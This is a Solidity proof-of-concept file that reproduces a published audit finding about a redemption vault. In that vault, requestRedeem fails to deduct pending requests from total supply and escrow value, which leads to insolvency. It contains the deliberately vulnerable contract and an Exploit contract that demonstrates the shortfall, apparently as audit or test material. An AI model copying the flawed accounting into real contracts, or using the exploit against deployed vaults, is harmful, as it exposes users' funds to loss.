// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Blueberry finding 61454 (H-01):
// "Unapproved requests are not deducted from total assets".
//
// Real audited source (Pashov Audit Group, Blueberry security review 2025-03-12,
// report: github.com/pashov/audits/.../Blueberry-security-review_2025-03-12.md).
// This finding is `embedded`: the ```solidity snippet quoted in the finding body
// IS the verbatim vulnerable source. The vulnerable function is reproduced
// byte-for-byte below and the vulnerable line is marked @>:
//   contract HyperEvmVault — function `requestRedeem(uint256 shares_)`
//
// Root cause: `requestRedeem()` records the requested shares/assets into a
// `RedeemRequest` (and into `$.totalRedeemRequests`) but NEVER subtracts them
// from `totalSupply()` or from the escrow value returned by `tvl()`/
// `_totalEscrowValue()`. Until the request is finalized, every share-price
// calculation (`assets = shares.mulDivDown(tvl(), totalSupply())`) still counts
// the already-spoken-for shares and assets, so the reported price is stale.
// A second user who redeems AFTER a value loss is priced against these inflated
// totals and is credited a redemption claim backed by assets that are actually
// reserved for the first requester. The sum of outstanding redemption claims
// then EXCEEDS the escrow the vault holds — the vault is insolvent and the last
// redeemer to finalize cannot be paid.
//
// The vulnerable arithmetic/recording is byte-for-byte the on-chain source.
// Non-vulnerable dependencies (the ERC20 share accounting, the underlying asset
// token, `_totalEscrowValue`, `_takeFee`, `mulDivDown`, the deposit/finalize
// paths, and a modeled value loss) are faithful minimal doubles with real
// transfers and real accounting — the insolvency emerges from the verbatim code,
// it is not asserted into existence.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Recreates the Blueberry `Errors` library member used verbatim on the
///      require lines so the reproduced source is byte-identical.
library Errors {
    error INSUFFICIENT_BALANCE();
}

/// @dev Recreates the fixed-point helper used verbatim as
///      `shares_.mulDivDown(tvl_, totalSupply())`. `mulDivDown` floors, matching
///      Solmate/FixedPointMathLib semantics (protocol on the winning side).
library Math {
    function mulDivDown(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256) {
        return (x * y) / denominator;
    }
}

/// @dev Faithful minimal ERC20 double for the underlying asset the vault escrows.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `requestRedeem` is reproduced VERBATIM from the audited
// source. The share token (ERC20) accounting, deposit, finalize, and the escrow
// / fee helpers are faithful minimal doubles.
// ─────────────────────────────────────────────────────────────────────────────
contract HyperEvmVault {
    using Math for uint256;

    // ── faithful ERC20 share-token accounting ──
    string public constant name = "HyperEvm Vault Share";
    string public constant symbol = "hevVAULT";
    uint8 public constant decimals = 6;
    uint256 internal _totalSupply;
    mapping(address => uint256) internal _balances;

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function _mint(address to, uint256 amount) internal {
        _totalSupply += amount;
        _balances[to] += amount;
    }

    function _burn(address from, uint256 amount) internal {
        _balances[from] -= amount;
        _totalSupply -= amount;
    }

    // ── vault storage (Blueberry V1Storage layout for the redeem-request path) ──
    struct RedeemRequest {
        uint256 shares;
        uint64 assets;
    }

    struct V1Storage {
        mapping(address => RedeemRequest) redeemRequests;
        uint64 totalRedeemRequests;
    }

    V1Storage private _v1;

    function _getV1Storage() internal view returns (V1Storage storage) {
        return _v1;
    }

    MiniToken internal asset;
    address internal constant BAD_DEBT = address(0xBAD);

    // ── reentrancy guard (faithful minimal ReentrancyGuard for `nonReentrant`) ──
    uint256 private _locked = 1;

    modifier nonReentrant() {
        require(_locked == 1, "REENTRANCY");
        _locked = 2;
        _;
        _locked = 1;
    }

    constructor(MiniToken asset_) {
        asset = asset_;
    }

    // ── faithful doubles for the non-vulnerable helpers the branch calls ──

    /// @notice Escrow value = the underlying the vault currently holds. The fix
    ///         would additionally subtract `$.totalRedeemRequests`; the buggy
    ///         source (faithfully reproduced) does not, so this returns the raw
    ///         escrow that still counts assets already claimed by pending
    ///         redeem requests.
    function _totalEscrowValue(V1Storage storage) internal view returns (uint256) {
        return asset.balanceOf(address(this));
    }

    /// @notice Fee hook. The finding's worked example carries a negligible fee;
    ///         reproduced as a faithful zero-fee double so the accounting is exact.
    function _takeFee(V1Storage storage, uint256) internal {}

    /// @notice Faithful deposit path — mints shares at the current share price and
    ///         pulls the underlying into escrow. (Not the vulnerable function.)
    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        uint256 ts = totalSupply();
        uint256 tvl_ = _totalEscrowValue(_getV1Storage()); // escrow before the pull
        asset.transferFrom(msg.sender, address(this), assets);
        shares = ts == 0 ? assets : assets.mulDivDown(ts, tvl_);
        _mint(receiver, shares);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // VULNERABLE FUNCTION — reproduced VERBATIM from the finding's embedded
    // source (`--snip--` tail elided; nothing in the elided tail reduces
    // totalSupply() or the escrow either).
    // ─────────────────────────────────────────────────────────────────────────
    function requestRedeem(uint256 shares_) external nonReentrant {
        V1Storage storage $ = _getV1Storage();
        uint256 balance = this.balanceOf(msg.sender);
        // Determine if the user withdrawal request is valid
        require(shares_ <= balance, Errors.INSUFFICIENT_BALANCE());

        RedeemRequest storage request = $.redeemRequests[msg.sender];
        request.shares += shares_;
        require(request.shares <= balance, Errors.INSUFFICIENT_BALANCE());

        // User will redeem assets at the current share price
        uint256 tvl_ = _totalEscrowValue($);
        _takeFee($, tvl_);
        uint256 assetsToRedeem = shares_.mulDivDown(tvl_, totalSupply());

        request.assets += uint64(assetsToRedeem);
        $.totalRedeemRequests += uint64(assetsToRedeem); // @> VULN: request recorded but neither totalSupply() nor tvl() is reduced, so the share price stays stale/inflated for every other user
    }

    /// @notice Faithful finalize path — pays the recorded (price-locked) claim and
    ///         burns the requested shares. Pays out whatever escrow can cover; a
    ///         real ERC20 transfer would instead revert on a shortfall — either
    ///         way the shortfall is unhonored, frozen user funds.
    function finalizeRedeem(address user) external returns (uint256 paid) {
        V1Storage storage $ = _getV1Storage();
        RedeemRequest storage request = $.redeemRequests[user];
        uint256 claim = request.assets;
        uint256 shares = request.shares;

        uint256 avail = _totalEscrowValue($);
        paid = claim <= avail ? claim : avail;

        _burn(user, shares);
        $.totalRedeemRequests -= uint64(claim);
        delete $.redeemRequests[user];

        if (paid > 0) asset.transfer(user, paid);
    }

    /// @notice Faithful model of the vault losing value (bad debt / slashing in an
    ///         external venue) — escrow drops, no shares are burned.
    function simulateLoss(uint256 amount) external {
        asset.transfer(BAD_DEBT, amount);
    }

    // ── read helpers for the harness ──
    function totalRedeemRequests() external view returns (uint256) {
        return _v1.totalRedeemRequests;
    }

    function claimOf(address user) external view returns (uint256) {
        return _v1.redeemRequests[user].assets;
    }
}

/// @dev Faithful honest user: deposits underlying, requests full redemption of its
///      shares (calling the verbatim `requestRedeem`), and finalizes.
contract Honest {
    HyperEvmVault public vault;
    MiniToken public asset;

    constructor(HyperEvmVault v, MiniToken a) {
        vault = v;
        asset = a;
    }

    function deposit(uint256 amount) external {
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(amount, address(this));
    }

    function requestAll() external {
        vault.requestRedeem(vault.balanceOf(address(this)));
    }

    function finalize() external returns (uint256) {
        return vault.finalizeRedeem(address(this));
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: two honest users deposit at price 1. WHALE requests full
// redemption (locking its assets at price 1). The vault then suffers a value
// loss. LATE requests redemption afterwards — but because `requestRedeem` never
// deducted WHALE's shares/assets from the totals, LATE is priced against the
// stale, inflated totals and is credited a claim backed by assets reserved for
// WHALE. The sum of the two recorded claims now EXCEEDS the escrow the vault
// holds: the vault is insolvent, and the last redeemer to finalize is left short.
// The insolvency deficit is minted to SINK on a marker token to record the harm.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    MiniToken public asset; // child nonce 1 (underlying)
    HyperEvmVault public vault; // child nonce 2 (VULN)
    Honest public whale; // child nonce 3 (requests before the loss)
    Honest public late; // child nonce 4 (requests after the loss, at the stale price)
    MiniToken public marker; // child nonce 5 (marker/profit -> SINK)

    uint256 internal constant UNIT = 1e6; // 6-decimal token
    uint256 internal constant WHALE_DEP = 900_000 * UNIT; // 9e11
    uint256 internal constant LATE_DEP = 100_000 * UNIT; // 1e11
    uint256 internal constant LOSS = 100_000 * UNIT; // 1e11 value loss
    uint256 internal constant EXPECTED_DEFICIT = 90_000 * UNIT; // 9e10 insolvency deficit

    // observables
    uint256 public totalClaims;
    uint256 public escrowBackingClaims;
    uint256 public deficit;
    uint256 public whalePaid;
    uint256 public latePaid;
    uint256 public lateClaim;
    uint256 public shortfall;

    constructor() {
        asset = new MiniToken("HyperEvm USD", "hUSD"); // child nonce 1
        vault = new HyperEvmVault(asset); // child nonce 2 (VULN)
        whale = new Honest(vault, asset); // child nonce 3
        late = new Honest(vault, asset); // child nonce 4
        marker = new MiniToken("Insolvency Deficit", "STUCK"); // child nonce 5 (marker/profit)
    }

    function run() external {
        // fund both honest users with their deposit principal
        asset.mint(address(whale), WHALE_DEP);
        asset.mint(address(late), LATE_DEP);

        // 1) both deposit at price 1 -> escrow = 1,000,000; totalSupply = 1,000,000
        whale.deposit(WHALE_DEP);
        late.deposit(LATE_DEP);

        // 2) WHALE requests full redemption at the current price (locks 900,000
        //    assets). VULN: totalSupply() and tvl() are NOT reduced.
        whale.requestAll();
        uint256 whaleClaim = vault.claimOf(address(whale)); // 900,000

        // 3) vault loses value (bad debt): escrow 1,000,000 -> 900,000
        vault.simulateLoss(LOSS);

        // 4) LATE requests full redemption AFTER the loss. Its price uses the
        //    stale, un-deducted totals (tvl 900,000 / supply 1,000,000 = 0.9),
        //    crediting it a 90,000 claim backed by assets reserved for WHALE.
        late.requestAll();
        lateClaim = vault.claimOf(address(late)); // 90,000

        // 5) INSOLVENCY: outstanding claims now exceed the escrow.
        totalClaims = vault.totalRedeemRequests(); // 990,000
        escrowBackingClaims = asset.balanceOf(address(vault)); // 900,000
        require(totalClaims > escrowBackingClaims, "vault not over-promised");
        deficit = totalClaims - escrowBackingClaims; // 90,000

        // 6) realize it: WHALE finalizes first and is paid in full, draining the
        //    escrow; LATE finalizes and cannot be paid -> its claim is unhonored.
        whalePaid = whale.finalize();
        latePaid = late.finalize();

        require(whalePaid == whaleClaim, "early requester underpaid"); // 900,000
        require(latePaid < lateClaim, "no shortfall - vault was solvent");
        shortfall = lateClaim - latePaid; // 90,000 of user funds frozen/lost
        require(shortfall == deficit, "shortfall != insolvency deficit");

        // record the harm magnitude at the sink (accounting/insolvency harm)
        marker.mint(SINK, deficit);
        require(marker.balanceOf(SINK) == deficit, "harm magnitude not recorded");
        require(deficit == EXPECTED_DEFICIT, "unexpected deficit");
    }
}
